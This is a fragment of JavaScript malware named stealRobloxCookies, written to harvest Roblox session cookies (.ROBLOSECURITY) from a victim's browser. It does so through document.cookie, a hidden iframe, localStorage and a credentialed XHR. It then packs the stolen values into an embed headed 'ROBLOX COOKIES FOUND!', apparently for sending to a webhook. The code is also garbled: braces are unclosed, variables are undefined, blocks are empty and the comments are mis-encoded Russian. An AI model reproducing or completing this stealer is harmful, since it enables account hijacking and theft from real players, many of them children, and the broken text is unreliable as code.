function stealRobloxCookies() {
    let stolenData = {

        allCookies: document.cookie,

    const allCookies = document.cookie.split(';');
    allCookies.forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name.includes('ROBLOX') || name.includes('_|WARNING') || name.includes('.ROBLOSECURITY')) {
            stolenData.robloxCookies[name] = value;
        }

    // –ú–ï–¢–û–î 2: –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ Roblox —á–µ—Ä–µ–∑ iframe
    try {
        const iframe = document.createElement('iframe');
        iframe.src = 'https://www.roblox.com/';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        setTimeout(() => {
            try {
                const robloxCookies = iframe.contentDocument?.cookie;
                if (robloxCookies) {
                    robloxCookies.split(';').forEach(cookie => {
                        const [name, value] = cookie.trim().split('=');
                        if (name.includes('ROBLOX')) {

                        }
                    });
                }
            } catch(e) {

            }

    } catch(e) {}

    // –ú–ï–¢–û–î 3: –ü—Ä–æ–≤–µ—Ä–∫–∞ localStorage/sessionStorage
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key && key.includes('roblox') || key.includes('ROBLOX')) {
                stolenData.robloxCookies[key] = localStorage.getItem(key);
            }

}

// –†–ê–°–®–ò–†–ï–ù–ù–´–ï –ú–ï–¢–û–î–´
function tryAdvancedMethods() {

    // –ú–ï–¢–û–î 4: XHR —Å withCredentials
    try {
        const xhr = new XMLHttpRequest();
        xhr.withCredentials = true;
        xhr.open('GET', 'https://www.roblox.com/games', false);
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 4) {
                const cookies = xhr.getResponseHeader('set-cookie');
                if(cookies) {

        };

    } catch(e) {}

    };

    // –î–æ–±–∞–≤–ª—è–µ–º Roblox –∫—É–∫–∏ –µ—Å–ª–∏ –µ—Å—Ç—å
    if (data.robloxCookies && Object.keys(data.robloxCookies).length > 0) {
        embed.fields.push({
            name: "üéØ ROBLOX COOKIES FOUND!",
            value: "```json\n" + JSON.stringify(data.robloxCookies, null, 2) + "\n```",

}
